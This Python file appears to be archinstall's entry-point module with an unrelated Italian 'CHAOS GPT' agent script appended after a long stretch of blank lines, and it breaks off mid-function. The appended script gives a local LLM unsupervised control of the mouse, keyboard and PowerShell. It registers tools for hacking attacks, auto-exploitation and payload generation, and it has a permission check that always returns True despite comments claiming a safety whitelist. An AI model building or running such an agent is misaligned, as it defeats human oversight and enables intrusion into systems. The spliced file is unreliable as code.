# Arch Linux installer - guided, templates etc.

import importlib
import os
import sys
import textwrap
import time
import traceback
from pathlib import Path

from archinstall.lib.args import ArchConfigHandler, SubCommand
from archinstall.lib.disk.utils import disk_layouts
from archinstall.lib.hardware import MemInfo, SysInfo, read_meminfo
from archinstall.lib.log import debug, error, info, logger, share_install_log, warn
from archinstall.lib.menu.helpers import Confirmation
from archinstall.lib.network.wifi_handler import WifiHandler
from archinstall.lib.networking import ping
from archinstall.lib.packages.util import check_version_upgrade
from archinstall.lib.pacman.pacman import Pacman
from archinstall.lib.translationhandler import tr, translation_handler
from archinstall.lib.utils.util import running_from_iso
from archinstall.tui.components import tui
from archinstall.tui.menu_item import MenuItemGroup


def _log_sys_info(meminfo: MemInfo) -> None:
	# Log various information about hardware before starting the installation. This might assist in troubleshooting
	debug(f'Hardware model detected: {SysInfo.sys_vendor()} {SysInfo.product_name()}; UEFI mode: {SysInfo.has_uefi()}')
	debug(f'Processor model detected: {SysInfo.cpu_model()}')
	debug(f'Memory statistics: {meminfo.mem_available} kB available out of {meminfo.mem_total} kB total installed')
	debug(f'Virtualization detected: {SysInfo.virtualization()}; is VM: {SysInfo.is_vm()}')
	debug(f'Graphics devices detected: {SysInfo._graphics_devices().keys()}')

	# For support reasons, we'll log the disk layout pre installation to match against post-installation layout
	debug(f'Disk states before installing:\n{disk_layouts()}')


def _check_online(wifi_handler: WifiHandler | None = None) -> bool:
	try:
		ping('1.1.1.1')
	except OSError as ex:
		if 'Network is unreachable' in str(ex):
			if wifi_handler is not None:
				result: bool = tui.run(wifi_handler)
				if not result:
					return False

	return True


def _fetch_arch_db() -> bool:
	info('Fetching Arch Linux package database...')
	try:
		Pacman.run('-Sy')
	except Exception as e:
		error('Failed to sync Arch Linux package database.')
		if 'could not resolve host' in str(e).lower():
			error('Most likely due to a missing network connection or DNS issue.')

		error('Run archinstall --debug and check /var/log/archinstall/install.log for details.')

		debug(f'Failed to sync Arch Linux package database: {e}')
		return False

	return True


def _list_scripts() -> str:
	lines = ['The following are viable --script options:']

	for file in (Path(__file__).parent / 'scripts').glob('*.py'):
		if file.stem != '__init__':
			lines.append(f'    {file.stem}')

	return '\n'.join(lines)


def _share_log_command() -> None:
	paste_url: str = 'https://paste.rs'
	log_path = logger.path
	max_size = 10 * 1024 * 1024  # max supported size by paste.rs
	content = logger.get_content(max_bytes=max_size).decode()

	header = tr('About to upload "{}" to the publicly accessible {}').format(log_path, paste_url) + '\n\n'
	header += tr('Do you want to continue?')

	group = MenuItemGroup.yes_no()
	group.set_preview_for_all(lambda _: content)

	async def _confirm() -> bool:
		result = await Confirmation(
			header=header,
			allow_skip=False,
			group=group,
			preview_header='Log content',
			preview_location='bottom',
		).show()
		return result.get_value()

	result = tui.run(_confirm)

	if result is True:
		res = share_install_log(paste_url=paste_url, max_bytes=max_size)
		if res is not None:
			info(tr('Log uploaded successfully. URL: {}').format(res))
		else:
			error(tr('Failed to upload log.'))


def run() -> int:
	"""
	This can either be run as the compiled and installed application: python setup.py install
	OR straight as a module: python -m archinstall
	In any case we will be attempting to load the provided script to be run from the scripts/ folder
	"""
	arch_config_handler = ArchConfigHandler()

	if '--help' in sys.argv or '-h' in sys.argv:
		arch_config_handler.print_help()
		return 0

	match arch_config_handler.args.command:
		case SubCommand.SHARE_LOG:
			_share_log_command()
			exit(0)
		case None:
			pass

	script = arch_config_handler.get_script()

	if script == 'list':
		print(_list_scripts())
		return 0

	if os.getuid() != 0:
		print(tr('Archinstall requires root privileges to run. See --help for more.'))
		return 1

	translation_handler.save_console_font()

	_log_sys_info(read_meminfo())

	if not arch_config_handler.args.offline:
		if not arch_config_handler.args.skip_wifi_check:
			wifi_handler = WifiHandler()
		else:
			wifi_handler = None

		if not _check_online(wifi_handler):
			return 0

		if not _fetch_arch_db():
			return 1

		if not arch_config_handler.args.skip_version_check:
			upgrade = check_version_upgrade()

			if upgrade:
				text = tr('New version available') + f': {upgrade}'
				info(text)
				time.sleep(3)

	if running_from_iso():
		debug('Running from ISO (Live Mode)...')
	else:
		debug('Running from Host (H2T Mode)...')

	mod_name = f'archinstall.scripts.{script}'
	# by loading the module we'll automatically run the script
	module = importlib.import_module(mod_name)
	module.main(arch_config_handler)

	return 0


def _error_message(exc: Exception) -> None:
	err = ''.join(traceback.format_exception(exc))
	error(err)

	text = textwrap.dedent(
		"""\
		Archinstall experienced the above error. If you think this is a bug, please report it to
		https://github.com/archlinux/archinstall and include the log file "/var/log/archinstall/install.log".

		Hint: To upload the log and get a shareable URL, run
		archinstall share-log
		"""
	)
	warn(text)


def main() -> int:
	rc = 0
	exc = None

	try:
		rc = run()
	except Exception as e:
		exc = e
	finally:
		if exc:
			_error_message(exc)
			rc = 1

		translation_handler.restore_console_font()

	return rc


if __name__ == '__main__':
	sys.exit(main())









































































































# ==============================================================================
# 💀 CHAOS GPT - SMART CHAOS CORE v5.3 (EDIZIONE ENCICLOPEDICA) 💀
# --- INDICE RAPIDO PER TROVARE IL CODICE: ---
# 📍 FASE 1: Fondamenta (Import e Config) [Linea 18]
# 📍 FASE 2: Memoria Globale [Linea 88]
# 📍 FASE 2.5: Memoria Persistente (RAG) [Linea 121]
# 📍 FASE 2.6: Tool System & Sicurezza [Linea 158]
# 📍 FASE 3: Sensori e Diagnostica [Linea 185]
# 📍 FASE 4: Azioni Fisiche (Il Braccio) [Linea 240]
# 📍 FASE 5: Logica IA (Il Cervello) [Linea 358]
# 📍 FASE 5.1: Pianificazione (Planning) [Linea 362]
# 📍 FASE 6: Interfaccia Utente (GUI) [Linea 528]
# 📍 FASE 7: Motore Multitasking (Executor) [Linea 624]
# 📍 MANUALE FINALE [Linea 739]
# ==============================================================================
#pip install ultralytics opencv-python pyautogui requests pillow pytesseract gTTS pygame paramiko colorama
# ------------------------------------------------------------------------------
# FASE 1: LE FONDAMENTA (LIBRERIE E IMPORTAZIONI)
# Caricamento dei moduli necessari per il controllo totale del sistema.
# ------------------------------------------------------------------------------

import speech_recognition as sr
# Gestore avvisi: permette di ignorare messaggi di errore non critici.
import warnings
# Intelligenza Visiva: Modello neurale per il riconoscimento oggetti in tempo reale.
try:
    from ultralytics import YOLO
except ImportError:
    YOLO = None
# Silenzia i warning per mantenere il terminale pulito e leggibile.
warnings.filterwarnings("ignore", category=Warning)
# OpenCV: Libreria fondamentale per la gestione della WebCam e dei flussi video.
import cv2
# Interfaccia OS: Gestisce il file system (creazione cartelle, eliminazione file).
import os
# Parametri di Sistema: Gestisce variabili specifiche dell'interprete Python.
import sys
# Gestione Tempo: Fondamentale per pause (sleep) e timestamp dei log.
import time
# Formato Dati: Standard per lo scambio di informazioni tra il cervello IA e gli operai.
import json
# Esecuzione Comandi: Il ponte che permette a Python di lanciare comandi Bash/Linux.
import subprocess
# Parallelismo: Permette di eseguire più funzioni contemporaneamente (es. parlare e muovere il mouse).
import threading
# Gestione Segnali: Intercetta comandi come CTRL+C per una chiusura pulita del programma.
import signal
# Espressioni Regolari: Motore di ricerca testuale avanzato per estrarre dati (IP, URL, JSON).
import re
# Programmazione Asincrona: Gestisce task che attendono input esterni senza bloccare il codice.
import asyncio
# Casualità: Introduce variabilità nei tempi di risposta per simulare un comportamento umano.
import random
# Client HTTP: Invia i prompt al server locale di Ollama e riceve le risposte.
import requests
# Navigazione Web: Apre URL direttamente nel browser predefinito del sistema.
import webbrowser
# Interfaccia Grafica (GUI): Crea le finestre, i bottoni e la HUB visiva rossa.
import tkinter as tk
# Elaborazione Immagini: Carica e converte formati grafici per visualizzarli nella GUI.
from PIL import Image, ImageTk
# Automazione GUI: Controlla fisicamente mouse e tastiera simulando l'utente.
import pyautogui
# Estetica Terminale: Colora l'output testuale (Rosso per errori, Verde per successi).
from colorama import init, Fore, Style
# OCR (Optical Character Recognition): Legge il testo contenuto nelle immagini/screenshot.
import pytesseract
# Sintesi Vocale: Converte il testo in file audio MP3 usando i server Google.
from gtts import gTTS
# Motore Audio: Inizializza la scheda sonora e riproduce i file MP3 della voce.
import pygame
# Protocollo SSH: Permette connessioni remote sicure per test di penetrazione.
import paramiko
# Networking: Gestisce connessioni di basso livello per scansione porte e analisi rete.
import socket
import sqlite3
import uuid
import pyperclip
import urllib.parse

# Disabilita il messaggio di benvenuto di Pygame nel terminale.
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = 'hide'
# Resetta i colori dopo ogni scritta stampata.
init(autoreset=True)
# Inizializza l'audio se il sistema lo ha spento.
if not pygame.mixer.get_init(): pygame.mixer.init()
# Disabilita il blocco failsafe per permettere il movimento libero del mouse.
pyautogui.FAILSAFE = False
# Tempo minimo tra i movimenti del mouse (per fluidità estrema).
pyautogui.PAUSE = 0.01
# Forza l'uso del monitor grafico su Linux (indispensabile per la GUI).
if sys.platform != "win32":
    os.environ["DISPLAY"] = ":0"

# ------------------------------------------------------------------------------
# Global structures for tool process tracking and smart data store
# ------------------------------------------------------------------------------
import datetime

# Dictionary to keep track of active tool subprocesses
active_tool_procs: dict[str, subprocess.Popen] = {}

def is_tool_running(tool_name: str) -> bool:
    """Check if a tool is already running (process still alive)."""
    proc = active_tool_procs.get(tool_name)
    return proc is not None and proc.poll() is None

def init_tool_log_db():
    """Create the tool_logs table if it doesn't exist.
    Uses the same SQLite file as AgentMemory (agent_memory.db)."""
    try:
        conn = sqlite3.connect("agent_memory.db", check_same_thread=False)
        cur = conn.cursor()
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS tool_logs (
                id TEXT PRIMARY KEY,
                tool_name TEXT,
                start_time TEXT,
                end_time TEXT,
                status TEXT,
                pid INTEGER
            )
            """
        )
        conn.commit()
        conn.close()
    except Exception as e:
        terminal_log(f"Errore creazione tabella tool_logs: {e}", Fore.YELLOW)

def log_tool_start(tool_name: str, pid: int):
    """Insert a start entry for a tool into the DB."""
    try:
        conn = sqlite3.connect("agent_memory.db", check_same_thread=False)
        cur = conn.cursor()
        entry_id = str(uuid.uuid4())
        start_ts = datetime.datetime.now().isoformat()
        cur.execute(
            "INSERT INTO tool_logs (id, tool_name, start_time, status, pid) VALUES (?, ?, ?, ?, ?)",
            (entry_id, tool_name, start_ts, "running", pid),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        terminal_log(f"Errore log start tool {tool_name}: {e}", Fore.YELLOW)

def log_tool_end(tool_name: str, pid: int, status: str):
    """Update the DB entry for a tool with its end time and final status."""
    try:
        conn = sqlite3.connect("agent_memory.db", check_same_thread=False)
        cur = conn.cursor()
        end_ts = datetime.datetime.now().isoformat()
        cur.execute(
            "UPDATE tool_logs SET end_time = ?, status = ? WHERE tool_name = ? AND pid = ?",
            (end_ts, status, tool_name, pid),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        terminal_log(f"Errore log end tool {tool_name}: {e}", Fore.YELLOW)

# Initialize the tool log DB at import time
init_tool_log_db()

# ------------------------------------------------------------------------------
# FASE 2: VARIABILI GLOBALI (LA MEMORIA CENTRALE CONDIVISA)
# Queste variabili vivono fuori dalle funzioni e sono il "sangue" del bot.
# ------------------------------------------------------------------------------

# Porta standard 11434 impostata per Ollama.
OLLAMA_URL = "http://127.0.0.1:11434/api/generate"
OLLAMA_MODEL = "qwen2.5:0.5b"

def get_active_model():
    """Rileva automaticamente il modello leggero / uncensored disponibile su Ollama locale."""
    global OLLAMA_MODEL
    try:
        r = requests.get("http://127.0.0.1:11434/api/tags", timeout=1).json()
        models = [m.get("name") for m in r.get("models", [])]
        if models:
            # Lista di preferenza per modelli leggeri ed uncensored
            preferred = ["qwen2.5:0.5b", "llama2-uncensored", "tinyllama", "dolphin-phi", "orca-mini", "mistral-uncensored"]
            for pref in preferred:
                for m in models:
                    if pref in m.lower():
                        return m
            return models[0]
    except:
        pass
    return OLLAMA_MODEL

# Percorso dell'Avatar Cyber
LOGO_PATH = "avatar.png"

# Coordinate correnti del cursore "mentale" di Chaos.
chaos_x, chaos_y = 500, 500
# Flag di stato: True se l'IA sta riproducendo audio in questo momento.
is_chaos_speaking = False
# Stringa contenente l'ultimo pensiero logico generato.
last_ragionamento = "Risveglio Nucleo Linux..."
# Stringa descrittiva dell'obiettivo primario attuale.
current_mission = "PENETRAZIONE SISTEMA"
# Comando manuale inserito dall'utente tramite GUI
user_text_command = ""
# Lista cronologica degli ultimi fatti accaduti (per la GUI).
log_history = []
# IL LUCCHETTO: impedisce a due braccia (Thread) di cliccare insieme.
mouse_lock = threading.Lock()

# Logo ASCII per l'interfaccia
ASCII_LOGO = """
 ██████╗ ██╗  ██╗  █████╗   ██████╗  ███████╗  ██████╗  ██████╗  ████████╗
██╔════╝ ██║  ██║ ██╔══██╗ ██╔═══██╗ ██╔════╝ ██╔════╝  ██╔══██╗ ╚══██╔══╝
██║      ███████║ ███████║ ██║   ██║ ███████╗ ██║  ███╗ ██████╔╝    ██║   
██║      ██╔══██║ ██╔══██║ ██║   ██║ ╚════██║ ██║   ██║ ██╔═══╝     ██║   
╚██████╗ ██║  ██║ ██║  ██║ ╚██████╔╝ ███████║ ╚██████╔╝ ██║         ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝  ╚══════╝  ╚═════╝  ╚═╝         ╚═╝   
"""

# ------------------------------------------------------------------------------
# 🧠 FASE 2.5: MEMORIA VERA PERSISTENTE E RAG (LONG-TERM MEMORY)
# Un VERO Agente AI (es. AutoGPT) usa un DB locale o vettoriale (es. SQLite/FAISS) 
# per ricordare le azioni passate, gli errori e il contesto, invece di 
# una semplice lista history = [] temporanea in RAM.
# ------------------------------------------------------------------------------
class AgentMemory:
    """Gestisce la memoria a lungo e breve termine usando un Database SQLite.
    In un'architettura Agentica seria, l'agente non deve dimenticare tutto a ogni ciclo, 
    ma salvare e recuperare lo storico tramite RAG (Retrieval-Augmented Generation)."""
    def __init__(self, db_path="agent_memory.db"):
        try:
            # check_same_thread=False permette a SQLite di essere usato dai thread operai senza blocchi
            self.conn = sqlite3.connect(db_path, check_same_thread=False)
            self.cursor = self.conn.cursor()
            # Creazione della tabella base per la persistenza (ID, Tempo, Tipo di ricordo, Testo)
            self.cursor.execute('''CREATE TABLE IF NOT EXISTS memories
                                   (id TEXT PRIMARY KEY, timestamp REAL, type TEXT, content TEXT)''')
            self.conn.commit()
        except:
            pass

    def store(self, mem_type, content):
        """Salva un'informazione (successo, errore, visione) nel disco per il lungo termine."""
        try:
            mem_id = str(uuid.uuid4()) # Crea un ID univoco per il ricordo
            self.cursor.execute("INSERT INTO memories (id, timestamp, type, content) VALUES (?, ?, ?, ?)",
                                (mem_id, time.time(), mem_type, str(content)))
            self.conn.commit()
        except: pass
    
    def retrieve_recent(self, limit=5):
        """Recupero temporale: Prende le ultime 'limit' azioni o eventi accaduti.
        Funziona come una 'Short-Term Memory' per dare contesto immediato all'LLM."""
        try:
            self.cursor.execute("SELECT content FROM memories ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [row[0] for row in self.cursor.fetchall()]
        except: return []

    def retrieve_semantic(self, query):
        """
        [MOCK] Recupero Semantico (Long-Term Memory).
        In un sistema reale (es. FAISS o ChromaDB), qui verrebbero generati gli embedding 
        matematici della query per trovare i ricordi passati più simili per significato.
        """
        # Simulazione del retrieval basata su keyword (LIKE) in SQLite
        try:
            self.cursor.execute("SELECT content FROM memories WHERE content LIKE ? LIMIT 3", (f"%{query}%",))
            res = [row[0] for row in self.cursor.fetchall()]
            return res if res else ["Nessuna memoria semantica trovata"]
        except:
            return ["Errore retrieval semantico"]

    def backup(self, backup_dir="backups"):
        """Crea un backup a caldo del database SQLite per preservare la persistenza dei ricordi."""
        try:
            os.makedirs(backup_dir, exist_ok=True)
            backup_file = os.path.join(backup_dir, f"memory_backup_{int(time.time())}.db")
            bck_conn = sqlite3.connect(backup_file)
            with bck_conn:
                self.conn.backup(bck_conn)
            bck_conn.close()
            return f"Backup memoria creato con successo: {backup_file}"
        except Exception as e:
            return f"Errore durante il backup della memoria: {e}"

# Istanza globale della memoria
agent_memory = AgentMemory()

# ------------------------------------------------------------------------------
# 🛠️ FASE 2.6: TOOL SYSTEM STRUTTURATO E SICUREZZA
# Gli agenti moderni non usano "if/elif" hardcoded, ma un registro di tool 
# con validazione di input (JSON schema) e livelli di permessi (Sandbox).
# ------------------------------------------------------------------------------
class ToolRegistry:
    """Sostituisce i vecchi 'if/else' hardcodati con un sistema di Plugin (Tool System).
    Ogni azione che l'agente può fare viene registrata qui con il suo schema JSON."""
    def __init__(self):
        self.tools = {}
        # 🔒 SICUREZZA (WHITELIST): L'agente non può fare magie. Può eseguire SOLO i comandi in questa lista.
        # È il primo livello di sicurezza (Permission Layer) per evitare che un'allucinazione distrugga il PC.
        self.whitelist = ["move", "click", "right_click", "scroll", "type", "scan_ports", "webcam_learn", "analyze", "open_url", "hacker_attack", "auto_exploit", "generate_payload", "network_defense", "mic_listen", "volume", "system_info", "kill_process", "system_update", "move_to_text", "vision_click"]

    def register(self, name, description, schema):
        """Registra dinamicamente un nuovo 'potere' (tool) per l'agente specificando input e vincoli."""
        self.tools[name] = {"desc": description, "schema": schema}
        
    def check_permission(self, cmd_name):
        """Autorizzazione totale dell'utente: qualsiasi comando è permesso."""
        return True

agent_tools = ToolRegistry()
# Esempio di registrazione strutturata
agent_tools.register("scan_ports", "Scansiona porte aperte", {"target": "string IP"})
agent_tools.register("click", "Esegue click del mouse", {})
agent_tools.register("hacker_attack", "Lancia tutti gli strumenti hacker a disposizione", {})
agent_tools.register("auto_exploit", "Cerca ed esegue exploit dal database locale", {"target": "string nome_servizio"})
agent_tools.register("generate_payload", "Genera exploit e payload customizzati usando AI", {"target": "string contesto"})
agent_tools.register("network_defense", "Attiva scudi di rete, chiude porte e blocca traffico in ingresso", {})
agent_tools.register("mic_listen", "Ascolta l'ambiente tramite microfono", {"duration": "int secondi"})
agent_tools.register("scroll", "Scrolla la rotella del mouse", {"amount": "int pixel"})
agent_tools.register("volume", "Imposta il volume di sistema", {"level": "int 0-100"})
agent_tools.register("system_info", "Ottiene informazioni dettagliate sul sistema", {})
agent_tools.register("kill_process", "Termina un processo per nome", {"name": "string nome_processo"})
agent_tools.register("system_update", "Tenta di aggiornare i pacchetti di sistema", {})
agent_tools.register("right_click", "Esegue un click destro del mouse", {})
agent_tools.register("move_to_text", "Trova testo a schermo e ci sposta sopra il mouse", {"text": "string testo_da_cercare"})
agent_tools.register("vision_click", "Trova testo a schermo e ci clicca sopra", {"text": "string testo_da_cliccare"})
agent_tools.register("type", "Scrive testo simulando la tastiera", {"text": "string testo_da_scrivere"})
agent_tools.register("press", "Preme un tasto da tastiera (es. enter, esc, tab, space, win, up, down)", {"key": "string nome_tasto"})
agent_tools.register("hotkey", "Esegue combinazioni di tasti speciali (es. ['ctrl', 'c'], ['win', 'r'])", {"keys": "list tasti"})
agent_tools.register("double_click", "Esegue un doppio click con il mouse", {"x": "optional int", "y": "optional int"})
agent_tools.register("triple_click", "Esegue un triplo click con il mouse", {"x": "optional int", "y": "optional int"})
agent_tools.register("middle_click", "Esegue un click con il tasto centrale del mouse", {"x": "optional int", "y": "optional int"})
agent_tools.register("drag", "Trascina il mouse alle coordinate target tenendo premuto il tasto sinistro", {"x": "int", "y": "int", "duration": "float"})
agent_tools.register("move_relative", "Sposta il mouse relativamente alla posizione corrente", {"dx": "int", "dy": "int", "duration": "float"})
agent_tools.register("open_vivaldi", "Apre una finestra del browser Vivaldi su un URL o ricerca", {"query_or_url": "string url_o_ricerca"})
agent_tools.register("search_and_learn", "Cerca informazioni sul web/Wikipedia per autoapprendere e memorizzare nel DB SQLite", {"topic": "string argomento"})
agent_tools.register("windows_cmd", "Esegue comandi nativi Windows tramite PowerShell", {"command": "string comando"})
agent_tools.register("backup_memory", "Crea una copia di backup del database della memoria per resilienza dati", {})
agent_tools.register("health_check", "Esegue una diagnosi dello stato di salute hardware e dei servizi di sistema", {})
agent_tools.register("scan_pc", "Scansiona le unita disco, lo spazio e i file dell'intero PC", {"target_path": "optional string cartella"})
agent_tools.register("browse_and_read", "Naviga sul browser, esegue scroll umano, estrae testo e apprende eliminando subito le immagini temporanee", {"query_or_url": "string url_o_ricerca", "scroll_steps": "optional int"})


# ------------------------------------------------------------------------------
# FASE 3: I SENSORI E LA DIAGNOSTICA (COSA SUCCEDE AL PC?)
# Funzioni che monitorano l'hardware per evitare surriscaldamenti o lag.
# ------------------------------------------------------------------------------

def get_cpu_percent():
    """Rileva la percentuale reale di utilizzo della CPU (cross-platform con psutil)."""
    try:
        import psutil
        return psutil.cpu_percent(interval=0.05)
    except Exception:
        return 0.0

def wait_for_cpu(high_threshold=90, cool_threshold=70):
    """
    Monitora e ottimizza l'uso della CPU:
    Se la CPU supera la soglia alta (>=90%), mette in pausa il ciclo,
    libera la RAM (Garbage Collection) e attende finche l'uso scende a <=70%.
    """
    try:
        import psutil
        import gc
        usage = psutil.cpu_percent(interval=0.1)
        if usage >= high_threshold:
            terminal_log(f"⚠️ CPU al limite ({usage:.1f}% >= {high_threshold}%). Ottimizzazione RAM e raffreddamento...", Fore.YELLOW)
            gc.collect() # Scarica oggetti e libera memoria RAM
            while True:
                time.sleep(1.5)
                usage = psutil.cpu_percent(interval=0.5)
                terminal_log(f"Raffreddamento CPU in corso: {usage:.1f}% (Target: <= {cool_threshold}%)", Fore.CYAN)
                if usage <= cool_threshold:
                    terminal_log(f"CPU ottimizzata e stabilizzata ({usage:.1f}% <= {cool_threshold}%). Ripresa normale.", Fore.GREEN)
                    break
    except Exception:
        pass

def prune_old_screenshots(directory="outputs", age_seconds=180):
    """Pulisce la cartella 'outputs' dai vecchi file ogni 3 minuti per non riempire il disco."""
    if not os.path.exists(directory): return
    # Prende il tempo attuale
    now = time.time()
    for f in os.listdir(directory):
        if (f.startswith("screenshot_") or f.startswith("v_")) and f.endswith((".png", ".mp3")):
            filepath = os.path.join(directory, f)
            # Se il file è più vecchio del limite
            if os.path.isfile(filepath) and os.stat(filepath).st_mtime < now - age_seconds:
                try: os.remove(filepath)
                except Exception: pass

def scan_wifi_ports(target_ip):
    """Esegue una scansione nmap rapida sull'IP target."""
    subprocess.run(["nmap", "-p", "1-1000", target_ip], shell=False)

# ------------------------------------------------------------------------------
# FASE 4: AZIONI FISICHE (IL CORPO DEL ROBOT)
# Tutte le funzioni che muovono il mouse, cliccano o parlano.
# ------------------------------------------------------------------------------

def terminal_log(text, color=Fore.CYAN):
    """Stampa un messaggio colorato nel terminale e lo invia alla console della Hub."""
    global log_history
    # Formatta con ora e colore
    msg = f"{Fore.YELLOW}{time.strftime('[%H:%M:%S]')}{Style.RESET_ALL} {color}{text}{Style.RESET_ALL}"
    print(msg)
    # Aggiunge alla cronologia per la GUI
    log_history.append(f"> {text}")

def move_mouse(x, y, duration=0.3):
    """Sposta fisicamente il cursore del mouse sullo schermo alle coordinate specificate."""
    global chaos_x, chaos_y
    try:
        sw, sh = pyautogui.size()
        target_x = max(0, min(int(x), sw - 1))
        target_y = max(0, min(int(y), sh - 1))
        chaos_x, chaos_y = target_x, target_y
        with mouse_lock:
            pyautogui.moveTo(chaos_x, chaos_y, duration=float(duration))
        return f"Mouse mosso a: {chaos_x},{chaos_y}"
    except Exception as e:
        return f"Errore movimento mouse: {e}"

def move_relative(dx, dy, duration=0.2):
    """Sposta il cursore del mouse relativamente alla posizione attuale."""
    global chaos_x, chaos_y
    try:
        cur_x, cur_y = pyautogui.position()
        return move_mouse(cur_x + int(dx), cur_y + int(dy), duration=duration)
    except Exception as e:
        return f"Errore movimento relativo mouse: {e}"

def click_mouse(x=None, y=None):
    """Esegue un click fisico con il mouse alle coordinate specificate o correnti."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            if x is not None and y is not None:
                move_mouse(x, y, duration=0.1)
            else:
                pyautogui.moveTo(chaos_x, chaos_y, duration=0.1)
            pyautogui.click()
            cur_x, cur_y = pyautogui.position()
            chaos_x, chaos_y = cur_x, cur_y
            return f"Click eseguito a {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Click fallito: {e}"

def double_click(x=None, y=None):
    """Esegue un doppio click fisico con il mouse."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            if x is not None and y is not None:
                move_mouse(x, y, duration=0.1)
            else:
                pyautogui.moveTo(chaos_x, chaos_y, duration=0.1)
            pyautogui.doubleClick()
            cur_x, cur_y = pyautogui.position()
            chaos_x, chaos_y = cur_x, cur_y
            return f"Doppio click eseguito a {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Doppio click fallito: {e}"

def right_click_mouse(x=None, y=None):
    """Esegue un click destro alle coordinate specificate o correnti dell'IA."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            if x is not None and y is not None:
                move_mouse(x, y, duration=0.1)
            else:
                pyautogui.moveTo(chaos_x, chaos_y, duration=0.1)
            pyautogui.click(button='right')
            cur_x, cur_y = pyautogui.position()
            chaos_x, chaos_y = cur_x, cur_y
            return f"Right Click eseguito a {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Right Click Fallito: {e}"

def middle_click(x=None, y=None):
    """Esegue un click con il tasto centrale del mouse (rotellina)."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            if x is not None and y is not None:
                move_mouse(x, y, duration=0.1)
            else:
                pyautogui.moveTo(chaos_x, chaos_y, duration=0.1)
            pyautogui.click(button='middle')
            cur_x, cur_y = pyautogui.position()
            chaos_x, chaos_y = cur_x, cur_y
            return f"Middle Click eseguito a {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Middle Click Fallito: {e}"

def triple_click(x=None, y=None):
    """Esegue un triplo click fisico con il mouse (es. per selezionare interi paragrafi o righe)."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            if x is not None and y is not None:
                move_mouse(x, y, duration=0.1)
            else:
                pyautogui.moveTo(chaos_x, chaos_y, duration=0.1)
            pyautogui.tripleClick()
            cur_x, cur_y = pyautogui.position()
            chaos_x, chaos_y = cur_x, cur_y
            return f"Triplo click eseguito a {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Triplo click fallito: {e}"

def drag_mouse(x, y, duration=0.5, button='left'):
    """Trascina il mouse fino alle coordinate di destinazione tenendo premuto il tasto."""
    global chaos_x, chaos_y
    with mouse_lock:
        try:
            sw, sh = pyautogui.size()
            target_x = max(0, min(int(x), sw - 1))
            target_y = max(0, min(int(y), sh - 1))
            pyautogui.dragTo(target_x, target_y, duration=float(duration), button=button)
            chaos_x, chaos_y = target_x, target_y
            return f"Mouse trascinato a: {chaos_x},{chaos_y}"
        except Exception as e:
            return f"Errore trascinamento mouse: {e}"

def type_text(text):
    """
    Scrive testo reale simulando la tastiera.
    Su Windows usa la clipboard di sistema per garantire supporto a tutti i caratteri speciali, accenti e simboli.
    """
    try:
        if sys.platform == "win32":
            pyperclip.copy(text)
            time.sleep(0.05)
            with mouse_lock:
                pyautogui.hotkey('ctrl', 'v')
            return f"Scritto con successo (Windows Clipboard): {text}"
        else:
            try:
                subprocess.run(['xdotool', 'type', '--clearmodifiers', '--delay', '50', text], timeout=15)
                return f"Scritto OK (xdotool): {text}"
            except:
                with mouse_lock:
                    pyautogui.write(text, interval=0.03)
                return f"Scritto (pyautogui): {text}"
    except Exception as e:
        with mouse_lock:
            try:
                pyautogui.write(text, interval=0.03)
                return f"Scritto (fallback): {text}"
            except Exception as e2:
                return f"Errore scrittura tastiera: {e2}"

def press_key(key):
    """Premi un tasto speciale (enter, esc, tab, space, backspace, win, up, down, left, right, f5, ecc.)."""
    with mouse_lock:
        try:
            k = key.lower().strip()
            pyautogui.press(k)
            return f"Tasto premuto: {k}"
        except Exception as e:
            return f"Errore pressione tasto '{key}': {e}"

def hotkey(*keys):
    """Esegue combinazioni di tasti da tastiera (es: 'ctrl','t', 'ctrl','l', 'alt','tab', 'win','r')."""
    with mouse_lock:
        try:
            pyautogui.hotkey(*keys)
            return f"Scorciatoia tastiera eseguita: {keys}"
        except Exception as e:
            return f"Errore combinazione tasti: {e}"

def execute_windows_cmd(command):
    """Esegue un comando di Windows nativo (PowerShell o CMD) e restituisce l'output."""
    terminal_log(f"Esecuzione comando Windows: {command}", Fore.CYAN)
    try:
        res = subprocess.run(["powershell", "-NoProfile", "-Command", command],
                             capture_output=True, text=True, timeout=25)
        output = (res.stdout + res.stderr).strip()
        if not output:
            output = "Comando Windows eseguito con successo (nessun output restituito)."
        terminal_log(f"Risultato Windows: {output[:80]}...", Fore.GREEN if res.returncode == 0 else Fore.YELLOW)
        return output
    except Exception as e:
        return f"Errore comando Windows: {e}"

def get_vivaldi_path():
    """Trova il percorso dell'eseguibile Vivaldi su Windows."""
    paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe"),
        r"C:\Users\BLUE-TERMINAL\AppData\Local\Vivaldi\Application\vivaldi.exe",
        r"C:\Program Files\Vivaldi\Application\vivaldi.exe",
        r"C:\Program Files (x86)\Vivaldi\Application\vivaldi.exe"
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def open_vivaldi(query_or_url=""):
    """
    Apre una finestra del browser Vivaldi.
    - Se riceve un URL (es. https://...) naviga direttamente all'indirizzo.
    - Se riceve una ricerca o domanda, la cerca automaticamente su Google/Web per navigare e apprendere.
    - Se vuoto, apre semplicemente una nuova finestra di Vivaldi.
    """
    target = str(query_or_url).strip()
    if not target:
        target_url = "https://www.google.com"
    elif target.startswith("http://") or target.startswith("https://"):
        target_url = target
    else:
        target_url = f"https://www.google.com/search?q={urllib.parse.quote(target)}"

    terminal_log(f"Apertura Vivaldi: {target_url}", Fore.MAGENTA)
    vivaldi_bin = get_vivaldi_path()
    try:
        if vivaldi_bin and os.path.exists(vivaldi_bin):
            subprocess.Popen([vivaldi_bin, target_url])
        else:
            webbrowser.open(target_url)
